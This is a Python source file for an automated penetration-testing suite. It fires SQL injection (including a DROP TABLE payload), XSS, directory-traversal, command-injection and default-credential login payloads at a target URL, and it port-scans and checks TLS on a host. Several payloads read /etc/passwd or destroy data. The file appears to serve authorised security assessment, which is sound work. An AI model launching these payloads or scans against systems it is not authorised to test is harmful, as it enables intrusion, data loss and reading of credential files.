#!/usr/bin/env python3
"""
Penetration Testing Suite for Claude Code V3.6.9
Automated security testing and vulnerability assessment
"""

import asyncio
import aiohttp
import socket
import ssl
import subprocess
import json
import re
import time
import random
import string
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
import logging

@dataclass
class PenetrationTestResult:
    """Penetration test result"""
    test_name: str
    target: str
    status: str  # success, failed, error
    vulnerability_found: bool
    severity: str  # critical, high, medium, low
    description: str
    evidence: str
    remediation: str
    exploit_payload: Optional[str] = None
    response_time: Optional[float] = None

class WebApplicationTester:
    """Web application penetration testing"""
    
    def __init__(self, base_url: str, session: aiohttp.ClientSession):
        self.base_url = base_url
        self.session = session
        self.common_paths = [
            '/admin', '/login', '/api', '/config', '/debug',
            '/test', '/backup', '/phpinfo.php', '/robots.txt',
            '/.env', '/.git', '/wp-admin', '/dashboard'
        ]
        
        # Common SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//"
        ]
        
        # Directory traversal payloads
        self.traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        # Command injection payloads
        self.command_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; ls -la",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`"
        ]
    
    async def test_directory_traversal(self, endpoint: str) -> List[PenetrationTestResult]:
        """Test for directory traversal vulnerabilities"""
        results = []
        
        for payload in self.traversal_payloads:
            try:
                test_url = f"{self.base_url}/{endpoint}?file={payload}"
                start_time = time.time()
                
                async with self.session.get(test_url) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    # Check for successful traversal indicators
                    traversal_indicators = [
                        "root:", "bin:", "daemon:",  # Unix /etc/passwd
                        "Windows Registry",          # Windows registry
                        "127.0.0.1",                # hosts file
                        "[boot loader]"              # Windows boot.ini
                    ]
                    
                    vulnerability_found = any(indicator in content for indicator in traversal_indicators)
                    
                    result = PenetrationTestResult(
                        test_name="Directory Traversal",
                        target=test_url,
                        status="success",
                        vulnerability_found=vulnerability_found,
                        severity="high" if vulnerability_found else "info",
                        description="Directory traversal vulnerability test",
                        evidence=content[:500] if vulnerability_found else "No evidence found",
                        remediation="Implement proper input validation and file access controls",
                        exploit_payload=payload,
                        response_time=response_time
                    )
                    
                    results.append(result)
                    
                    if vulnerability_found:
                        break  # Stop on first successful exploit
                        
            except Exception as e:
                result = PenetrationTestResult(
                    test_name="Directory Traversal",
                    target=test_url,
                    status="error",
                    vulnerability_found=False,
                    severity="info",
                    description=f"Test error: {str(e)}",
                    evidence="",
                    remediation="N/A"
                )
                results.append(result)
        
        return results
    
    async def test_sql_injection(self, endpoint: str, parameters: Dict[str, str]) -> List[PenetrationTestResult]:
        """Test for SQL injection vulnerabilities"""
        results = []
        
        for param_name, param_value in parameters.items():
            for payload in self.sql_payloads:
                try:
                    # Test GET parameters
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    start_time = time.time()
                    async with self.session.get(f"{self.base_url}/{endpoint}", params=test_params) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        # Check for SQL error indicators
                        sql_error_indicators = [
                            "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB",
                            "PostgreSQL query failed", "SQLite3::", "sqlite3.OperationalError",
                            "Warning: mysql_", "MySQLSyntaxErrorException"
                        ]
                        
                        # Check for time-based injection (SLEEP payload)
                        time_based_vuln = "SLEEP" in payload and response_time > 4
                        
                        # Check for error-based injection
                        error_based_vuln = any(indicator in content for indicator in sql_error_indicators)
                        
                        vulnerability_found = time_based_vuln or error_based_vuln
                        
                        result = PenetrationTestResult(
                            test_name="SQL Injection",
                            target=f"{self.base_url}/{endpoint}",
                            status="success",
                            vulnerability_found=vulnerability_found,
                            severity="critical" if vulnerability_found else "info",
                            description=f"SQL injection test on parameter '{param_name}'",
                            evidence=content[:500] if error_based_vuln else f"Response time: {response_time:.2f}s" if time_based_vuln else "",
                            remediation="Use parameterized queries and input validation",
                            exploit_payload=payload,
                            response_time=response_time
                        )
                        
                        results.append(result)
                        
                        if vulnerability_found:
                            break  # Stop on first successful exploit for this parameter
                            
                except Exception as e:
                    result = PenetrationTestResult(
                        test_name="SQL Injection",
                        target=f"{self.base_url}/{endpoint}",
                        status="error",
                        vulnerability_found=False,
                        severity="info",
                        description=f"Test error on parameter '{param_name}': {str(e)}",
                        evidence="",
                        remediation="N/A"
                    )
                    results.append(result)
        
        return results
    
    async def test_xss(self, endpoint: str, parameters: Dict[str, str]) -> List[PenetrationTestResult]:
        """Test for Cross-Site Scripting vulnerabilities"""
        results = []
        
        for param_name, param_value in parameters.items():
            for payload in self.xss_payloads:
                try:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    start_time = time.time()
                    async with self.session.get(f"{self.base_url}/{endpoint}", params=test_params) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        # Check if payload is reflected in response
                        vulnerability_found = payload in content or payload.lower() in content.lower()
                        
                        # Additional XSS indicators
                        xss_indicators = ["<script", "javascript:", "onerror=", "onload="]
                        reflected_indicators = any(indicator in content.lower() for indicator in xss_indicators)
                        
                        if not vulnerability_found and reflected_indicators:
                            vulnerability_found = True
                        
                        result = PenetrationTestResult(
                            test_name="Cross-Site Scripting (XSS)",
                            target=f"{self.base_url}/{endpoint}",
                            status="success",
                            vulnerability_found=vulnerability_found,
                            severity="high" if vulnerability_found else "info",
                            description=f"XSS test on parameter '{param_name}'",
                            evidence=content[:500] if vulnerability_found else "",
                            remediation="Implement output encoding and Content Security Policy",
                            exploit_payload=payload,
                            response_time=response_time
                        )
                        
                        results.append(result)
                        
                        if vulnerability_found:
                            break  # Stop on first successful exploit for this parameter
                            
                except Exception as e:
                    result = PenetrationTestResult(
                        test_name="Cross-Site Scripting (XSS)",
                        target=f"{self.base_url}/{endpoint}",
                        status="error",
                        vulnerability_found=False,
                        severity="info",
                        description=f"Test error on parameter '{param_name}': {str(e)}",
                        evidence="",
                        remediation="N/A"
                    )
                    results.append(result)
        
        return results
    
    async def test_command_injection(self, endpoint: str, parameters: Dict[str, str]) -> List[PenetrationTestResult]:
        """Test for command injection vulnerabilities"""
        results = []
        
        for param_name, param_value in parameters.items():
            for payload in self.command_payloads:
                try:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    start_time = time.time()
                    async with self.session.get(f"{self.base_url}/{endpoint}", params=test_params) as response:
                        response_time = time.time() - start_time
                        content = await response.text()
                        
                        # Check for command execution indicators
                        command_indicators = [
                            "root:", "bin:", "daemon:",  # Linux passwd file
                            "Windows Registry",          # Windows registry
                            "total ",                    # ls -la output
                            "Directory of",              # Windows dir output
                            "drwx",                      # Linux directory permissions
                        ]
                        
                        vulnerability_found = any(indicator in content for indicator in command_indicators)
                        
                        result = PenetrationTestResult(
                            test_name="Command Injection",
                            target=f"{self.base_url}/{endpoint}",
                            status="success",
                            vulnerability_found=vulnerability_found,
                            severity="critical" if vulnerability_found else "info",
                            description=f"Command injection test on parameter '{param_name}'",
                            evidence=content[:500] if vulnerability_found else "",
                            remediation="Validate input and avoid system command execution",
                            exploit_payload=payload,
                            response_time=response_time
                        )
                        
                        results.append(result)
                        
                        if vulnerability_found:
                            break  # Stop on first successful exploit for this parameter
                            
                except Exception as e:
                    result = PenetrationTestResult(
                        test_name="Command Injection",
                        target=f"{self.base_url}/{endpoint}",
                        status="error",
                        vulnerability_found=False,
                        severity="info",
                        description=f"Test error on parameter '{param_name}': {str(e)}",
                        evidence="",
                        remediation="N/A"
                    )
                    results.append(result)
        
        return results
    
    async def test_authentication_bypass(self, login_endpoint: str) -> List[PenetrationTestResult]:
        """Test for authentication bypass vulnerabilities"""
        results = []
        
        # Common authentication bypass payloads
        bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": ""},
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin", "password": "' OR 1=1--"}
        ]
        
        for payload in bypass_payloads:
            try:
                start_time = time.time()
                async with self.session.post(f"{self.base_url}/{login_endpoint}", data=payload) as response:
                    response_time = time.time() - start_time
                    content = await response.text()
                    
                    # Check for successful authentication indicators
                    success_indicators = [
                        "dashboard", "welcome", "logout", "profile",
                        "admin panel", "control panel", "settings"
                    ]
                    
                    # Check for redirect to authenticated area
                    redirect_success = response.status in [302, 301] and response.headers.get('Location', '').endswith('/dashboard')
                    
                    content_success = any(indicator in content.lower() for indicator in success_indicators)
                    
                    vulnerability_found = redirect_success or content_success
                    
                    result = PenetrationTestResult(
                        test_name="Authentication Bypass",
                        target=f"{self.base_url}/{login_endpoint}",
                        status="success",
                        vulnerability_found=vulnerability_found,
                        severity="critical" if vulnerability_found else "info",
                        description="Authentication bypass test",
                        evidence=f"Status: {response.status}, Location: {response.headers.get('Location', 'N/A')}" if vulnerability_found else "",
                        remediation="Implement proper authentication validation and session management",
                        exploit_payload=str(payload),
                        response_time=response_time
                    )
                    
                    results.append(result)
                    
                    if vulnerability_found:
                        break  # Stop on first successful bypass
                        
            except Exception as e:
                result = PenetrationTestResult(
                    test_name="Authentication Bypass",
                    target=f"{self.base_url}/{login_endpoint}",
                    status="error",
                    vulnerability_found=False,
                    severity="info",
                    description=f"Test error: {str(e)}",
                    evidence="",
                    remediation="N/A"
                )
                results.append(result)
        
        return results
    
    async def test_csrf(self, endpoint: str) -> List[PenetrationTestResult]:
        """Test for Cross-Site Request Forgery vulnerabilities"""
        results = []
        
        try:
            # First, get the form to check for CSRF tokens
            async with self.session.get(f"{self.base_url}/{endpoint}") as response:
                content = await response.text()
                
                # Check if CSRF token is present
                csrf_patterns = [
                    r'name=["\']csrf[_-]?token["\']',
                    r'name=["\']_token["\']',
                    r'name=["\']authenticity[_-]?token["\']',
                    r'content=["\'][a-zA-Z0-9+/=]+["\'].*name=["\']csrf',
                ]
                
                csrf_token_found = any(re.search(pattern, content, re.IGNORECASE) for pattern in csrf_patterns)
                
                # Test CSRF vulnerability by making request without token
                test_data = {"action": "test", "value": "csrf_test"}
                
                start_time = time.time()
                async with self.session.post(f"{self.base_url}/{endpoint}", data=test_data) as csrf_response:
                    response_time = time.time() - start_time
                    csrf_content = await csrf_response.text()
                    
                    # If action succeeds without CSRF token, it's vulnerable
                    success_indicators = ["success", "updated", "saved", "deleted"]
                    action_succeeded = any(indicator in csrf_content.lower() for indicator in success_indicators)
                    
                    vulnerability_found = not csrf_token_found or action_succeeded
                    
                    result = PenetrationTestResult(
                        test_name="Cross-Site Request Forgery (CSRF)",
                        target=f"{self.base_url}/{endpoint}",
                        status="success",
                        vulnerability_found=vulnerability_found,
                        severity="medium" if vulnerability_found else "info",
                        description="CSRF protection test",
                        evidence=f"CSRF token found: {csrf_token_found}, Action succeeded: {action_succeeded}",
                        remediation="Implement CSRF tokens and validate them on state-changing operations",
                        response_time=response_time
                    )
                    
                    results.append(result)
                    
        except Exception as e:
            result = PenetrationTestResult(
                test_name="Cross-Site Request Forgery (CSRF)",
                target=f"{self.base_url}/{endpoint}",
                status="error",
                vulnerability_found=False,
                severity="info",
                description=f"Test error: {str(e)}",
                evidence="",
                remediation="N/A"
            )
            results.append(result)
        
        return results

class NetworkScanner:
    """Network security scanning"""
    
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
    async def port_scan(self, target: str, ports: List[int] = None) -> List[PenetrationTestResult]:
        """Perform port scanning"""
        results = []
        ports = ports or self.common_ports
        
        for port in ports:
            try:
                start_time = time.time()
                
                # Attempt to connect to port
                future = asyncio.open_connection(target, port)
                
                try:
                    reader, writer = await asyncio.wait_for(future, timeout=3)
                    writer.close()
                    await writer.wait_closed()
                    
                    response_time = time.time() - start_time
                    port_open = True
                    
                except asyncio.TimeoutError:
                    port_open = False
                    response_time = 3.0
                
                # Determine service and risk
                service = self.identify_service(port)
                risk_level = self.assess_port_risk(port, port_open)
                
                result = PenetrationTestResult(
                    test_name="Port Scan",
                    target=f"{target}:{port}",
                    status="success",
                    vulnerability_found=port_open and risk_level in ["high", "critical"],
                    severity=risk_level if port_open else "info",
                    description=f"Port {port} ({service}) scan",
                    evidence=f"Port {'open' if port_open else 'closed'}",
                    remediation="Close unnecessary ports and services" if port_open and risk_level in ["high", "critical"] else "N/A",
                    response_time=response_time
                )
                
                results.append(result)
                
            except Exception as e:
                result = PenetrationTestResult(
                    test_name="Port Scan",
                    target=f"{target}:{port}",
                    status="error",
                    vulnerability_found=False,
                    severity="info",
                    description=f"Port scan error: {str(e)}",
                    evidence="",
                    remediation="N/A"
                )
                results.append(result)
        
        return results
    
    def identify_service(self, port: int) -> str:
        """Identify service running on port"""
        service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
            443: "HTTPS", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt"
        }
        return service_map.get(port, "Unknown")
    
    def assess_port_risk(self, port: int, is_open: bool) -> str:
        """Assess security risk of open port"""
        if not is_open:
            return "info"
        
        high_risk_ports = [21, 23, 135, 139, 1723, 3389]  # FTP, Telnet, RPC, NetBIOS, PPTP, RDP
        medium_risk_ports = [22, 25, 110, 143, 5900]      # SSH, SMTP, POP3, IMAP, VNC
        low_risk_ports = [80, 443, 8080]                  # HTTP, HTTPS
        
        if port in high_risk_ports:
            return "high"
        elif port in medium_risk_ports:
            return "medium"
        elif port in low_risk_ports:
            return "low"
        else:
            return "medium"  # Default for unknown ports
    
    async def ssl_scan(self, target: str, port: int = 443) -> List[PenetrationTestResult]:
        """Scan SSL/TLS configuration"""
        results = []
        
        try:
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            start_time = time.time()
            
            # Connect and get certificate info
            with socket.create_connection((target, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    response_time = time.time() - start_time
                    
                    # Get certificate information
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Analyze SSL/TLS security
                    vulnerabilities = []
                    
                    # Check TLS version
                    if version in ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]:
                        vulnerabilities.append(f"Insecure TLS version: {version}")
                    
                    # Check cipher strength
                    if cipher and len(cipher) > 2:
                        cipher_name = cipher[0]
                        if any(weak in cipher_name.upper() for weak in ["RC4", "DES", "MD5", "NULL"]):
                            vulnerabilities.append(f"Weak cipher: {cipher_name}")
                    
                    # Check certificate validity
                    if cert:
                        import datetime
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if not_after < datetime.datetime.now():
                            vulnerabilities.append("Certificate expired")
                        
                        # Check for self-signed
                        if cert.get('issuer') == cert.get('subject'):
                            vulnerabilities.append("Self-signed certificate")
                    
                    vulnerability_found = len(vulnerabilities) > 0
                    severity = "high" if vulnerability_found else "info"
                    
                    result = PenetrationTestResult(
                        test_name="SSL/TLS Security Scan",
                        target=f"{target}:{port}",
                        status="success",
                        vulnerability_found=vulnerability_found,
                        severity=severity,
                        description="SSL/TLS configuration assessment",
                        evidence=f"TLS Version: {version}, Cipher: {cipher[0] if cipher else 'Unknown'}, Issues: {', '.join(vulnerabilities) if vulnerabilities else 'None'}",
                        remediation="Update to TLS 1.2+ and use strong cipher suites" if vulnerability_found else "N/A",
                        response_time=response_time
                    )
                    
                    results.append(result)
                    
        except Exception as e:
            result = PenetrationTestResult(
                test_name="SSL/TLS Security Scan",
                target=f"{target}:{port}",
                status="error",
                vulnerability_found=False,
                severity="info",
                description=f"SSL scan error: {str(e)}",
                evidence="",
                remediation="N/A"
            )
            results.append(result)
        
        return results

class PenetrationTestSuite:
    """Complete penetration testing suite"""
    
    def __init__(self, target_url: str = None):
        self.target_url = target_url
        self.network_scanner = NetworkScanner()
        self.results = []
        
    async def run_web_application_tests(self, base_url: str = None) -> List[PenetrationTestResult]:
        """Run web application penetration tests"""
        base_url = base_url or self.target_url
        if not base_url:
            return []
        
        results = []
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            web_tester = WebApplicationTester(base_url, session)
            
            # Test common endpoints
            test_endpoints = [
                {"endpoint": "login", "params": {"username": "test", "password": "test"}},
                {"endpoint": "search", "params": {"q": "test"}},
                {"endpoint": "user", "params": {"id": "1"}},
                {"endpoint": "admin", "params": {"action": "view"}},
                {"endpoint": "api/users", "params": {"id": "1"}}
            ]
            
            for test_config in test_endpoints:
                endpoint = test_config["endpoint"]
                params = test_config["params"]
                
                try:
                    # Test SQL Injection
                    sql_results = await web_tester.test_sql_injection(endpoint, params)
                    results.extend(sql_results)
                    
                    # Test XSS
                    xss_results = await web_tester.test_xss(endpoint, params)
                    results.extend(xss_results)
                    
                    # Test Command Injection
                    cmd_results = await web_tester.test_command_injection(endpoint, params)
                    results.extend(cmd_results)
                    
                    # Test Directory Traversal
                    traversal_results = await web_tester.test_directory_traversal(endpoint)
                    results.extend(traversal_results)
                    
                    # Test CSRF (for form endpoints)
                    if endpoint in ["login", "admin"]:
                        csrf_results = await web_tester.test_csrf(endpoint)
                        results.extend(csrf_results)
                    
                except Exception as e:
                    logging.error(f"Error testing endpoint {endpoint}: {str(e)}")
            
            # Test authentication bypass
            if "login" in [t["endpoint"] for t in test_endpoints]:
                auth_results = await web_tester.test_authentication_bypass("login")
                results.extend(auth_results)
        
        return results
    
    async def run_network_tests(self, target_host: str) -> List[PenetrationTestResult]:
        """Run network penetration tests"""
        results = []
        
        try:
            # Port scanning
            port_results = await self.network_scanner.port_scan(target_host)
            results.extend(port_results)
            
            # SSL/TLS testing for HTTPS ports
            ssl_results = await self.network_scanner.ssl_scan(target_host, 443)
            results.extend(ssl_results)
            
        except Exception as e:
            logging.error(f"Error in network testing: {str(e)}")
        
        return results
    
    async def run_comprehensive_pentest(self, target_host: str = None, target_url: str = None) -> Dict:
        """Run comprehensive penetration test"""
        start_time = time.time()
        all_results = []
        
        # Web application tests
        if target_url:
            web_results = await self.run_web_application_tests(target_url)
            all_results.extend(web_results)
        
        # Network tests
        if target_host:
            network_results = await self.run_network_tests(target_host)
            all_results.extend(network_results)
        
        end_time = time.time()
        
        # Analyze results
        summary = self.analyze_results(all_results)
        
        return {
            "start_time": start_time,
            "end_time": end_time,
            "duration": end_time - start_time,
            "total_tests": len(all_results),
            "vulnerabilities_found": len([r for r in all_results if r.vulnerability_found]),
            "results": all_results,
            "summary": summary,
            "recommendations": self.generate_recommendations(all_results)
        }
    
    def analyze_results(self, results: List[PenetrationTestResult]) -> Dict:
        """Analyze penetration test results"""
        summary = {
            "total_tests": len(results),
            "vulnerabilities_found": 0,
            "severity_distribution": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "test_distribution": {},
            "vulnerable_targets": set(),
            "risk_score": 0
        }
        
        for result in results:
            if result.vulnerability_found:
                summary["vulnerabilities_found"] += 1
                summary["vulnerable_targets"].add(result.target)
            
            summary["severity_distribution"][result.severity] += 1
            
            test_name = result.test_name
            if test_name not in summary["test_distribution"]:
                summary["test_distribution"][test_name] = {"total": 0, "vulnerable": 0}
            
            summary["test_distribution"][test_name]["total"] += 1
            if result.vulnerability_found:
                summary["test_distribution"][test_name]["vulnerable"] += 1
        
        # Convert set to list for JSON serialization
        summary["vulnerable_targets"] = list(summary["vulnerable_targets"])
        
        # Calculate risk score
        risk_weights = {"critical": 25, "high": 15, "medium": 5, "low": 2, "info": 0}
        summary["risk_score"] = sum(
            summary["severity_distribution"][severity] * weight
            for severity, weight in risk_weights.items()
        )
        
        return summary
    
    def generate_recommendations(self, results: List[PenetrationTestResult]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Get vulnerability types found
        vuln_types = set()
        critical_issues = []
        
        for result in results:
            if result.vulnerability_found:
                vuln_types.add(result.test_name)
                if result.severity == "critical":
                    critical_issues.append(result.test_name)
        
        # Priority recommendations for critical issues
        if critical_issues:
            recommendations.append(f"CRITICAL: Immediately address {len(critical_issues)} critical vulnerabilities")
        
        # Specific recommendations by vulnerability type
        if "SQL Injection" in vuln_types:
            recommendations.append("Implement parameterized queries and input validation to prevent SQL injection")
        
        if "Cross-Site Scripting (XSS)" in vuln_types:
            recommendations.append("Implement output encoding and Content Security Policy to prevent XSS attacks")
        
        if "Command Injection" in vuln_types:
            recommendations.append("Avoid system command execution and implement strict input validation")
        
        if "Directory Traversal" in vuln_types:
            recommendations.append("Implement file access controls and path validation")
        
        if "Authentication Bypass" in vuln_types:
            recommendations.append("Strengthen authentication mechanisms and implement proper session management")
        
        if "Cross-Site Request Forgery (CSRF)" in vuln_types:
            recommendations.append("Implement CSRF tokens for all state-changing operations")
        
        if "SSL/TLS Security Scan" in vuln_types:
            recommendations.append("Update SSL/TLS configuration to use strong protocols and ciphers")
        
        if "Port Scan" in vuln_types:
            recommendations.append("Close unnecessary network ports and services")
        
        # General security recommendations
        recommendations.extend([
            "Implement regular security testing in development lifecycle",
            "Establish security monitoring and incident response procedures",
            "Conduct security awareness training for development team",
            "Implement Web Application Firewall (WAF) for additional protection"
        ])
        
        return recommendations[:10]  # Limit to top 10 recommendations


async def main():
    """Main execution for penetration testing"""
    pentest_suite = PenetrationTestSuite()
    
    # Example usage
    target_host = "127.0.0.1"
    target_url = "http://127.0.0.1:8080"
    
    print("Starting penetration testing suite...")
    
    results = await pentest_suite.run_comprehensive_pentest(
        target_host=target_host,
        target_url=target_url
    )
    
    print(f"Penetration testing completed:")
    print(f"- Total tests: {results['total_tests']}")
    print(f"- Vulnerabilities found: {results['vulnerabilities_found']}")
    print(f"- Duration: {results['duration']:.2f} seconds")
    print(f"- Risk score: {results['summary']['risk_score']}")
    
    # Save results
    results_file = Path("security/pentest_results.json")
    results_file.parent.mkdir(exist_ok=True)
    
    # Convert results for JSON serialization
    json_results = results.copy()
    json_results["results"] = [
        {
            "test_name": r.test_name,
            "target": r.target,
            "status": r.status,
            "vulnerability_found": r.vulnerability_found,
            "severity": r.severity,
            "description": r.description,
            "evidence": r.evidence,
            "remediation": r.remediation,
            "exploit_payload": r.exploit_payload,
            "response_time": r.response_time
        }
        for r in results["results"]
    ]
    
    with open(results_file, 'w') as f:
        json.dump(json_results, f, indent=2)
    
    print(f"Results saved to {results_file}")


if __name__ == "__main__":
    asyncio.run(main())